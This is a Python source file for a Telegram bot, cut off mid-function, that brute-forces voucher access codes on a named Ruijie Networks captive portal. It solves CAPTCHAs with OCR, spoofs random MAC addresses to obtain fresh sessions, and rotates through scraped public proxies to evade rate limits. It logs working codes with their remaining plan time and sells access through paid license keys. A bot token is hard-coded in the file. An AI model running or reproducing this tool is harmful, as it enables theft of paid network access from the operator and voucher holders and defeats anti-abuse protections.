#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import json
import time
import random
import hashlib
import asyncio
import datetime

from urllib.parse import urljoin

import aiohttp
from aiohttp_socks import ProxyConnector

import ddddocr

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

BOT_TOKEN = "8585973091:AAEtLjvF1Y4y4kRyavpHtPAnwrlupAxtdUo"
TELEGRAM_PROXY = os.getenv("TELEGRAM_PROXY", "").strip()

ADMIN_IDS = [8585973091]

FILE_PATH = "allinone.txt"
LAST_RUN_FILE = "last_run.txt"
PROXY_FILE = "proxies.txt"
PORTAL_URL_PATH = "portal_url_"
PAID_KEYS_FILE = "paid_keys.txt"
OWNER_LICENSE_FILE = "owner_license.txt"

NUM_WORKERS = 10000
CONCURRENCY = 100
MAX_CODES_PER_SESSION = 750
MAX_CODES_PER_SID = 750
TIMEOUT_SEC = 6

USE_PROXY = True
PROXY_TIMEOUT = 8

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
]

PORTAL_BASE = "https://portal-as.ruijienetworks.com"
PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"

CHARSET_DIGITS = "012345678"
CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
CHARSET_MIX = "0123456789abcdefghijklmnopqrstuvwxyz"

_CHARSET_DIGITS_T = tuple(CHARSET_DIGITS)
_CHARSET_ABC_T = tuple(CHARSET_ABC)
_CHARSET_MIX_T = tuple(CHARSET_MIX)

MODES = {
    "num6": "🔢 Number 6",
    "num7": "🔢 Number 7",
    "num8": "🔢 Number 8",
    "num9": "🔢 Number 9",
    "eng6": "🔤 Eng 6",
    "eng7": "🔤 Eng 7",
    "eng8": "🔤 Eng 8",
    "mix6": "☣️ Mix 6",
    "mix7": "☣️ Mix 7",
    "mix8": "☣️ Mix 8",
    "custom": "🎯 Custom Start",
}

PLAN_EMOJIS = ("LORD🎃",)

def get_plan_emoji(index):
    return PLAN_EMOJIS[index % len(PLAN_EMOJIS)]

def get_time_emoji(time_str):
    if not time_str:
        return "⏰"
    t = str(time_str).lower()
    if "day" in t:
        return "📆"
    return "⏰"

def get_tried_emoji(tried):
    try:
        if int(tried) < 100000:
            return "🪫"
    except (TypeError, ValueError):
        pass
    return "🔋"

bred = "\x1b[1;31m"
bgreen = "\x1b[1;32m"
bcyan = "\x1b[1;36m"
white = "\x1b[37m"
yellow = "\x1b[33m"
reset = "\x1b[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
]

_ocr_instance = None
_proxy_manager = None
user_scanners = {}
SCAN_SEMAPHORE = asyncio.Semaphore(CONCURRENCY)
paid_users = {}

async def fetch_proxy_source(session, url):
    try:
        async with session.get(url, timeout=10) as res:
            if res.status == 200:
                text = await res.text()
                return text.splitlines()
    except:
        pass
    return []

async def gather_proxies():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_proxy_source(session, url) for url in PROXY_SOURCES]
        results = await asyncio.gather(*tasks)
        pool = set()
        for res in results:
            for line in res:
                line = line.strip()
                if line and ":" in line:
                    if not line.startswith("http") and not line.startswith("socks"):
                        pool.add(f"http://{line}")
                    else:
                        pool.add(line)
        return list(pool)

async def test_single_proxy(semaphore, proxy, direct_ip):
    async with semaphore:
        clean = proxy.replace("://?@", "://")
        is_socks = "socks" in proxy.lower()
        start_time = time.perf_counter()
        try:
            if is_socks:
                connector = ProxyConnector.from_url(clean)
                async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=6)) as session:
                    async with session.get("https://api.ipify.org?format=json") as res:
                        if res.status == 200:
                            data = await res.json()
                            latency = round((time.perf_counter() - start_time) * 1000, 2)
                            return {"proxy": clean, "latency": latency}
            else:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=6)) as session:
                    async with session.get("https://api.ipify.org?format=json", proxy=clean) as res:
                        if res.status == 200:
                            data = await res.json()
                            latency = round((time.perf_counter() - start_time) * 1000, 2)
                            return {"proxy": clean, "latency": latency}
        except:
            pass
        return None

async def auto_fetch_and_test_proxies():
    print(bcyan + "[~] Fetching fresh proxies from online sources..." + reset)
    raw_pool = await gather_proxies()
    print(bcyan + f"[~] Total candidates found: {len(raw_pool)}" + reset)

    direct_ip = ""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get("https://api.ipify.org?format=json", timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    direct_ip = data.get("ip")
        except:
            pass

    semaphore = asyncio.Semaphore(100)
    print(bcyan + "[~] Testing proxies with concurrency rate: 100..." + reset)

    tasks = [test_single_proxy(semaphore, p, direct_ip) for p in raw_pool]
    results = await asyncio.gather(*tasks)

    valid_proxies = []
    for r in results:
        if r:
            valid_proxies.append(r)
            print(bgreen + f"[LIVE] 😈 {r['proxy']} | Latency: {r['latency']}ms" + reset)

    valid_proxies.sort(key=lambda x: x["latency"])

    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        for p in valid_proxies:
            f.write(f"{p['proxy']}\n")

    print(bgreen + f"[✓] Total Verified Live Proxies Saved: {len(valid_proxies)}" + reset)

# --- AUTO REFRESHER BACKGROUND WORKER ---
async def proxy_auto_refresher():
    while True:
        await asyncio.sleep(45)  # Every 45 seconds, check proxy pool health
        pm = get_proxy_manager()
        active_count = pm.get_active_count()
        if active_count < 15:  # If proxies drop below 15, auto-harvest fresh ones
            print(bcyan + f"[~] Proxy pool is low ({active_count} remaining). Auto-harvesting fresh proxies..." + reset)
            try:
                raw_pool = await gather_proxies()
                if raw_pool:
                    direct_ip = ""
                    async with aiohttp.ClientSession() as session:
                        try:
                            async with session.get("https://api.ipify.org?format=json", timeout=5) as resp:
                                if resp.status == 200:
                                    data = await resp.json()
                                    direct_ip = data.get("ip")
                        except:
                            pass

                    semaphore = asyncio.Semaphore(100)
                    tasks = [test_single_proxy(semaphore, p, direct_ip) for p in raw_pool]
                    results = await asyncio.gather(*tasks)

                    valid_proxies = [r['proxy'] for r in results if r]
                    if valid_proxies:
                        pm.add_proxies(valid_proxies)
                        print(bgreen + f"[✓] Auto-Refreshed! Added {len(valid_proxies)} fresh proxies to pool." + reset)
            except Exception as e:
                print(bred + f"[!] Auto-refresh error: {e}" + reset)

def ensure_files_exist():
    files = {
        FILE_PATH: "",
        LAST_RUN_FILE: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        PAID_KEYS_FILE: "# Format: <key_hash>:<expiry>:<plan>:<signature>\n",
    }
    for fname, content in files.items():
        if not os.path.exists(fname):
            try:
                with open(fname, "w") as f:
                    f.write(content)
            except OSError:
                pass

def show_banner():
    line = "=" * 60
    print(bcyan + line)
    print("   ⚡ FLASH  ASYNC EXTREME  ⚡   ")
    print("        Telegram    @Lord")
    print(line + reset)
    print(white + "Checking authorization..." + reset)

def encrypt_key_data(key_str, expiry_str):
    return hashlib.sha256(f"{key_str}:{expiry_str}".encode()).hexdigest()

def check_time_integrity():
    now = datetime.datetime.now()
    last_run_time = None
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE) as f:
                raw_text = f.read().strip()
            if raw_text:
                last_run_time = datetime.datetime.strptime(raw_text, "%Y-%m-%d %H:%M:%S")
        except (OSError, ValueError):
            last_run_time = None
    if last_run_time and now < last_run_time:
        sys.exit(1)
    try:
        with open(LAST_RUN_FILE, "w") as f:
            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
    except OSError:
        pass

def display_remaining_time(expiry_date):
    now = datetime.datetime.now()
    remaining = int(max((expiry_date - now).total_seconds(), 0))
    days, remainder = divmod(remaining, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    if days:
        time_str = f"{days} days {hours} hour {minutes} min"
    elif hours:
        time_str = f"{hours} hr {minutes} min"
    else:
        time_str = f"{minutes} min"
    print(yellow + f"[*] Time left: {time_str}  ")
    print(f"[-] Expired on ({expiry_date.strftime('%Y-%m-%d %H:%M')}) " + reset)

def check_approval():
    if not os.path.exists(OWNER_LICENSE_FILE):
        print(bgreen + "[+] Access Granted!" + reset)
        return
    try:
        with open(OWNER_LICENSE_FILE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) >= 2:
                    expiry_str = ":".join(parts[1:])
                    try:
                        expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    except ValueError:
                        continue
                    if datetime.datetime.now() >= expiry_date:
                        sys.exit(1)
                    print(bgreen + "[+] Access Granted!" + reset)
                    display_remaining_time(expiry_date)
                    return
    except Exception:
        pass
    print(bgreen + "[+] Access Granted!" + reset)

def parse_key_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    try:
        first_colon = line.index(":")
        key_hash = line[:first_colon]
        rest = line[first_colon+1:]
        last_colon = rest.rindex(":")
        signature = rest[last_colon+1:]
        rest2 = rest[:last_colon]
        second_last = rest2.rindex(":")
        plan = rest2[second_last+1:]
        expiry_str = rest2[:second_last]
        return {"key_hash": key_hash, "expiry": expiry_str, "plan": plan, "signature": signature}
    except (ValueError, IndexError):
        return None

def load_paid_keys_local():
    keys = {}
    if not os.path.exists(PAID_KEYS_FILE):
        try:
            with open(PAID_KEYS_FILE, "w") as f:
                f.write("# Format: <key_hash>:<expiry>:<plan>:<signature>\n")
        except OSError:
            pass
        return keys
    try:
        with open(PAID_KEYS_FILE) as f:
            for line in f:
                entry = parse_key_line(line)
                if not entry:
                    continue
                if encrypt_key_data(entry["key_hash"], entry["expiry"]) != entry["signature"]:
                    continue
                keys[entry["key_hash"]] = {"expiry": entry["expiry"], "plan": entry["plan"]}
    except Exception:
        pass
    return keys

def validate_paid_key(user_key):
    if not user_key:
        return None
    user_key = user_key.strip()
    if len(user_key) < 8:
        return None
    keys = load_paid_keys_local()
    if not keys:
        return None
    key_hash = hashlib.sha256(user_key.encode()).hexdigest()[:32]
    entry = keys.get(key_hash)
    if not entry:
        return None
    try:
        expiry_date = datetime.datetime.strptime(entry["expiry"], "%Y-%m-%d %H:%M:%S")
    except (ValueError, KeyError):
        return None
    if datetime.datetime.now() >= expiry_date:
        return {"valid": False, "reason": "expired", "expiry": expiry_date}
    return {"valid": True, "expiry": expiry_date, "plan": entry.get("plan", "paid")}

def is_user_authorized(user_id):
    if user_id in ADMIN_IDS:
        return True
    entry = paid_users.get(user_id)
    if not entry:
        return False
    if datetime.datetime.now() >= entry["expiry"]:
        return False
    return True

def is_admin(user_id):
    return user_id in ADMIN_IDS

def register_paid_user(user_id, key, expiry, plan):
    paid_users[user_id] = {"key": key, "expiry": expiry, "plan": plan}
    try:
        data = {}
        if os.path.exists(PAID_KEYS_FILE + ".users"):
            try:
                with open(PAID_KEYS_FILE + ".users") as f:
                    data = json.load(f)
            except Exception:
                data = {}
        data[str(user_id)] = {"key": key, "expiry": expiry.strftime("%Y-%m-%d %H:%M:%S"), "plan": plan}
        with open(PAID_KEYS_FILE + ".users", "w") as f:
            json.dump(data, f, indent=2)
    except OSError:
        pass

def load_registered_users():
    fpath = PAID_KEYS_FILE + ".users"
    if not os.path.exists(fpath):
        return
    try:
        with open(fpath) as f:
            data = json.load(f)
        for uid_str, entry in data.items():
            try:
                expiry = datetime.datetime.strptime(entry["expiry"], "%Y-%m-%d %H:%M:%S")
            except (ValueError, KeyError):
                continue
            if datetime.datetime.now() < expiry:
                paid_users[int(uid_str)] = {"key": entry.get("key", ""), "expiry": expiry, "plan": entry.get("plan", "paid")}
    except Exception:
        pass

class ProxyManager:
    def __init__(self, file_path, max_fails=3):
        self.file_path = file_path
        self.max_fails = max_fails
        self.proxies = []
        self.used_proxies = set()
        self.fail_counts = {}
        self.lock = asyncio.Lock()
        self.index = 0
        self.load()

    def _normalize(self, proxy):
        proxy = (proxy or "").strip()
        if not proxy or proxy.startswith("#"):
            return None
        if "://" in proxy:
            scheme, rest = proxy.split("://", 1)
            proxy = f"{scheme.lower()}://{rest}"
        else:
            proxy = ("socks5://" if "@" in proxy else "http://") + proxy
        return proxy

    def _validate_proxy_format(self, proxy):
        try:
            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
            if "@" in rest:
                rest = rest.split("@", 1)[1]
            host, port = rest.rsplit(":", 1)
            return bool(host and port and 1 <= int(port) <= 65535)
        except Exception:
            return False

    def _host_port_key(self, proxy):
        try:
            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
            if "@" in rest:
                rest = rest.split("@", 1)[1]
            return rest.lower()
        except Exception:
            return proxy.lower()

    def load(self):
        try:
            if not os.path.exists(self.file_path):
                with open(self.file_path, "w") as f:
                    f.write("")
            with open(self.file_path) as f:
                raw = f.read().splitlines()
            valid = [self._normalize(line) for line in raw]
            valid = [p for p in valid if p and self._validate_proxy_format(p)]
            
            seen = set()
            self.proxies = []
            for p in valid:
                if p not in seen:
                    seen.add(p)
                    self.proxies.append(p)
            self.fail_counts = {p: 0 for p in self.proxies}
            self.used_proxies = set()
        except Exception:
            pass

    def reload(self):
        self.load()

    def add_proxies(self, proxy_lines):
        added = invalid = duplicate = 0
        existing_keys = {self._host_port_key(p) for p in self.proxies}
        seen_in_batch = set()

        for line in proxy_lines:
            p = self._normalize(line)
            if not p or not self._validate_proxy_format(p):
                invalid += 1
                continue
            hp = self._host_port_key(p)
            if p in existing_keys or hp in seen_in_batch:
                duplicate += 1
                continue
            seen_in_batch.add(hp)
            existing_keys.add(hp)
            self.proxies.append(p)
            self.fail_counts[p] = 0
            added += 1

        if added:
            random.shuffle(self.proxies)
        self._save_to_file()
        return added, invalid, duplicate

    def _save_to_file(self):
        try:
            with open(self.file_path, "w") as f:
                for p in self.proxies:
                    f.write(p + "\n")
        except OSError:
            pass

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            self.used_proxies.add(p)
            return p

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.fail_counts[proxy] = self.fail_counts.get(proxy, 0) + 1
            if self.fail_counts[proxy] >= self.max_fails:
                if proxy in self.proxies:
                    self.proxies.remove(proxy)
                self.fail_counts.pop(proxy, None)
                if self.index >= len(self.proxies) and self.proxies:
                    self.index = 0
                self._save_to_file()

    def stats(self):
        return len(self.proxies), len(self.used_proxies)

    def get_active_count(self):
        return len(self.proxies)

    def get_used_count(self):
        return len(self.used_proxies)

    def clear_all(self):
        self.proxies = []
        self.used_proxies = set()
        self.fail_counts = {}
        self.index = 0
        self._save_to_file()

def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

def create_connector_for_proxy(proxy):
    if not proxy or not USE_PROXY:
        return None
    try:
        if proxy.startswith(("socks4://", "socks5://")):
            return ProxyConnector.from_url(proxy, rdns=True)
        return ProxyConnector.from_url(proxy)
    except Exception:
        return None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

def ocr_image_bytes_fast(image_bytes):
    return get_ocr_instance().classification(image_bytes)

async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        async with session.get(captcha_url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
            if resp.status != 200:
                return None
            image_content = await resp.read()
        if not image_content:
            return None
        text = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
        if not text:
            return None
        return text.strip().upper()
    except Exception:
        return None

def get_user_data(user_id):
    p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
    if os.path.exists(p_file):
        try:
            with open(p_file) as f:
                return f.read().strip()
        except OSError:
            pass
    return None

def generate_random_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}mac={new_mac}"

def build_headers(referer=PORTAL_INDEX):
    return {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=utf-8",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "Origin": PORTAL_BASE,
        "Referer": referer,
    }

async def get_sid_from_gateway(session, portal_url, user_id):
    mac = generate_random_mac()
    url = replace_mac(portal_url, mac)
    headers = {
        "user-agent": random.choice(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
            final_url = str(resp.url)
            try:
                body = await resp.text()
            except Exception:
                body = ""
        m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
        if m:
            return m.group(1), final_url
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", body)
        if m:
            return m.group(1), final_url
        m = re.search(r"location\.href\s*=\s*[\'\"]([^\'\"]+)[\'\"]", body)
        if m:
            next_url = urljoin(final_url, m.group(1))
            m2 = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", next_url)
            if m2:
                return m2.group(1), next_url
        return None, final_url
    except Exception:
        return None, None

def _balance_dicts(value):
    if isinstance(value, dict):
        yield value
        for child in value.values():
            yield from _balance_dicts(child)
    elif isinstance(value, list):
        for child in value:
            yield from _balance_dicts(child)

def _format_balance_minutes(value):
    try:
        minutes = int(float(value))
    except (TypeError, ValueError):
        return None
    if minutes < 0:
        return f"Expired ({abs(minutes)} mins)"
    hours, mins = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    if days:
        return f"{days} day {hours} hr {mins} min"
    return f"{hours} hr {mins} min"

def _format_balance_expiry(value):
    if not value:
        return None
    text = str(value).strip()
    if not text:
        return None
    try:
        expiry = datetime.datetime.fromisoformat(text.replace("Z", "+00:00"))
        if expiry.tzinfo:
            expiry = expiry.astimezone(datetime.timezone.utc).replace(tzinfo=None)
        remaining = int((expiry - datetime.datetime.utcnow()).total_seconds() // 60)
        return _format_balance_minutes(remaining)
    except (TypeError, ValueError, OverflowError):
        return text

async def fetch_balance(active_token, code, proxy):
    if not active_token:
        return "📏: N/A, ⏰: N/A"
    connector = create_connector_for_proxy(proxy)
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            url = f"{BALANCE_API}{active_token}"
            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json;",
                "user-agent": random.choice(USER_AGENTS),
                "x-requested-with": "XMLHttpRequest",
                "Origin": PORTAL_BASE,
                "Referer": PORTAL_BALANCE_PAGE + active_token,
            }
            async with session.get(url, headers=headers,
                                   params={"sessionId": active_token, "accessCode": code},
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
                if resp.status != 200:
                    return "📏: N/A, ⏰: N/A"
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    return "📏: N/A, ⏰: N/A"
                dictionaries = list(_balance_dicts(data))
                for res in dictionaries:
                    plan = (res.get("profileName") or res.get("planName")
                            or res.get("packageName") or res.get("productName")
                            or res.get("profile") or "Unknown")
                    remaining_keys = (
                        "remainingMinutes", "remainMinutes", "leftMinutes",
                        "remainingTimeMinutes", "durationMinutes", "totalMinutes", "totalTime",
                    )
                    for key in remaining_keys:
                        if res.get(key) is not None:
                            time_str = _format_balance_minutes(res[key])
                            if time_str:
                                return f"📏: {plan}, ⏰: {time_str}"
                    for key in ("remainingTime", "remainTime", "leftTime", "validTime", "duration", "time"):
                        if res.get(key) is not None:
                            time_str = _format_balance_expiry(res[key])
                            if time_str:
                                return f"📏: {plan}, ⏰: {time_str}"
                    for key in ("expireTime", "expiryTime", "expireAt", "expiresAt", "expirationTime"):
                        if res.get(key) is not None:
                            time_str = _format_balance_expiry(res[key])
                            if time_str:
                                return f"📏: {plan}, ⏰: {time_str}"
                return "📏: N/A, ⏰: N/A"
    except Exception:
        return "📏: N/A, ⏰: N/A"
    finally:
        if connector is not None:
            try:
                await connector.close()
            except Exception:
                pass

async def check_balance(active_token, code, user_id, proxy_str, save_to_file=True):
    if save_to_file:
        try:
            with open(FILE_PATH, "a") as f:
                f.write(f"{code}\n")
        except OSError:
            pass
    balance = await fetch_balance(active_token, code, proxy_str)
    plan_name = "Unknown"
    time_str = "N/A"
    if balance and "📏:" in balance:
        try:
            parts = balance.replace("📏:", "").split(", ⏰:")
            if len(parts) >= 2:
                plan_name = parts[0].strip()
                time_str = parts[1].strip()
        except Exception:
            pass
    return plan_name, time_str

async def check_single_access_code(session, code, current_session_id,
                                   login_url, captcha_base_url, verify_url,
                                   headers, user_id, current_proxy):
    if not current_session_id:
        return "net"
    try:
        captcha_url = f"{CAPTCHA_IMAGE_URL}?sessionId={current_session_id}&_t={int(time.time() * 1000)}"
        captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
        if not captcha_text:
            return "net"

        v_payload = {"sessionId": current_session_id, "authCode": captcha_text}
        v_headers = {
            "content-type": "application/json",
            "user-agent": random.choice(USER_AGENTS),
            "Origin": PORTAL_BASE,
            "Referer": PORTAL_INDEX,
        }
        async with session.post(verify_url, json=v_payload, headers=v_headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as v_resp:
            v_body = await v_resp.text()

        verified = False
        try:
            v_json = json.loads(v_body)
            if v_json.get("success") is True:
                verified = True
        except Exception:
            if '"success":true' in v_body.replace(" ", ""):
                verified = True
        if not verified:
            return "captcha"

        l_payload = {
            "accessCode": code,
            "sessionId": current_session_id,
            "apiVersion": 1,
            "authCode": captcha_text,
        }
        async with session.post(login_url, json=l_payload, headers=v_headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as l_resp:
            body = await l_resp.text()

        body_nospace = body.replace(" ", "")
        if '"success":true' in body_nospace:
            return "hit"

        low = body.lower()
        if "request limited" in low or "exceeds the limit" in low or "limited" in low:
            return "limit"
        return "bad"
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return "net"
    except asyncio.CancelledError:
        raise
    except Exception:
        return "net"

def make_code(mode, start_digit=None, counter=None):
    if mode == "custom" and counter is not None:
        return str(counter).zfill(6)

    def _gen(charset, length, use_digit=False):
        if use_digit and start_digit is not None:
            first = str(start_digit)
            rest = "".join(random.choices(charset, k=length - 1))
            return first + rest
        return "".join(random.choices(charset, k=length))

    if mode == "num6":
        return _gen(_CHARSET_DIGITS_T, 6, use_digit=True)
    if mode == "num7":
        return _gen(_CHARSET_DIGITS_T, 7, use_digit=True)
    if mode == "num8":
        return _gen(_CHARSET_DIGITS_T, 8, use_digit=True)
    if mode == "num9":
        return _gen(_CHARSET_DIGITS_T, 9, use_digit=True)

    if mode == "eng6":
        return _gen(_CHARSET_ABC_T, 6)
    if mode == "eng7":
        return _gen(_CHARSET_ABC_T, 7)
    if mode == "eng8":
        return _gen(_CHARSET_ABC_T, 8)
    if mode == "mix6":
        return _gen(_CHARSET_MIX_T, 6)
    if mode == "mix7":
        return _gen(_CHARSET_MIX_T, 7)
    if mode == "mix8":
        return _gen(_CHARSET_MIX_T, 8)
    return _gen(_CHARSET_DIGITS_T, 6)

def _is_na(value):
    return value in (None, "", "N/A", "Unknown", "null")

def _is_unlimited(*values):
    for v in values:
        if v and ("unlimited" in str(v).lower() or "unlim" in str(v).lower()):
            return True
    return False

async def fetch_single_balance(state, hit_entry, user_id, save_to_file=False):
    plan_ok = not _is_na(hit_entry.get("plan"))
    time_ok = not _is_na(hit_entry.get("time_str"))

    if plan_ok and time_ok:
        hit_entry["fetching"] = False
        return

    sid = hit_entry.get("sid")
    if not sid:
        hit_entry["fetching"] = False
        return

    try:
        plan, time_str = await check_balance(
            sid, hit_entry["code"], user_id,
            hit_entry.get("proxy"), save_to_file=save_to_file
        )
    except Exception:
        return

    if not plan_ok and not _is_na(plan):
        hit_entry["plan"] = plan

    if not time_ok and not _is_na(time_str):
        hit_entry["time_str"] = time_str

    if (not _is_na(hit_entry.get("plan"))
            and not _is_na(hit_entry.get("time_str"))):
        hit_entry["fetching"] = False

async def balance_retry_task(context, user_id):
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    try:
        while not stop_event.is_set():
            await asyncio.sleep(3)
            if stop_event.is_set():
                break
            pending = [hd for hd in state.get("hit_details", [])
                       if _is_na(hd.get("plan")) or _is_na(hd.get("time_str"))]
            if not pending:
                continue
            for hd in pending:
                if stop_event.is_set():
                    break
                if not _is_na(hd.get("plan")) and not _is_na(hd.get("time_str")):
                    continue
                await fetch_single_balance(state, hd, user_id, save_to_file=False)
    except asyncio.CancelledError:
        raise

def _format_hit_line(index, hit_entry):
    plan = hit_entry.get("plan")
    time_str = hit_entry.get("time_str")

    if _is_na(plan) or _is_na(time_str):
        return f"🔥 `{hit_entry['code']}` ⏳ Fetching..."

    if _is_unlimited(plan, time_str):
        return f"🔥 `{hit_entry['code']}` ♾️ Unlimited"

    plan_emoji = get_plan_emoji(index)
    time_emoji = get_time_emoji(time_str)
    return (
        f"🔥 `{hit_entry['code']}` "
        f"{plan_emoji} {plan} "
        f"{time_emoji} {time_str}"
    )

def _format_hit_line_plain(index, hit_entry):
    plan = hit_entry.get("plan")
    time_str = hit_entry.get("time_str")

    if _is_na(plan) or _is_na(time_str):
        return f"{index+1}. 🔥 {hit_entry['code']} ⏳ Fetching..."

    if _is_unlimited(plan, time_str):
        return f"{index+1}. 🔥 {hit_entry['code']} ♾️ Unlimited"

    plan_emoji = get_plan_emoji(index)
    time_emoji = get_time_emoji(time_str)
    return (
        f"{index+1}. 🔥 {hit_entry['code']} "
        f"{plan_emoji} {plan} "
        f"{time_emoji} {time_str}"
    )

async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    pm = get_proxy_manager()
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    mode = state.get("mode", "num6")
    start_digit = state.get("start_digit")
    tried_codes = state["tried_codes"]

    while not stop_event.is_set():
        proxy = await pm.get_next()
        if not proxy:
            await asyncio.sleep(1)
            continue

        connector = create_connector_for_proxy(proxy)
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
            headers={"user-agent": random.choice(USER_AGENTS)},
        )
        try:
            sid, _gateway = await get_sid_from_gateway(session, state["portal_url"], user_id)
            if not sid:
                state["net"] += 1
                state["recent_logs"].append("⚠️ SID မရ — retry")
                await pm.mark_bad(proxy)
                await asyncio.sleep(0.05)
                continue

            codes_checked_this_sid = 0
            sid_failures = 0
            codes_checked_this_session = 0

            while (codes_checked_this_session < MAX_CODES_PER_SESSION
                   and codes_checked_this_sid < MAX_CODES_PER_SID
                   and not stop_event.is_set()):

                if len(tried_codes) > 2000000:
                    trimmed = set(list(tried_codes)[-1500000:])
                    state["tried_codes"] = trimmed
                    tried_codes = state["tried_codes"]

                code = None
                for _ in range(50):
                    if mode == "custom":
                        state["counter"] += 1
                        code = make_code(mode, start_digit, state["counter"])
                    else:
                        code = make_code(mode, start_digit)
                    if code not in tried_codes:
                        break
                if code is None:
                    if mode == "custom":
                        continue
                    break
                tried_codes.add(code)
                state["current_code"] = code

                async with SCAN_SEMAPHORE:
                    result = await check_single_access_code(
                        session, code, sid, login_url, captcha_base_url,
                        verify_url, headers, user_id, proxy,
                    )
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                state["tried"] += 1

                if result == "hit":
                    state["hits"] += 1
                    state["hit_list"].append(code)
                    state["last_hit"] = code
                    state["recent_logs"].append(f"✅ HIT: {code}")

                    now = datetime.datetime.now()
                    hit_entry = {
                        "code": code,
                        "time": now,
                        "plan": "N/A",
                        "time_str": "N/A",
                        "sid": sid,
                        "proxy": proxy,
                        "fetching": True,
                    }
                    state["hit_details"].append(hit_entry)
                    asyncio.create_task(
                        fetch_single_balance(state, hit_entry, user_id, save_to_file=True)
                    )
                    break

                elif result == "limit":
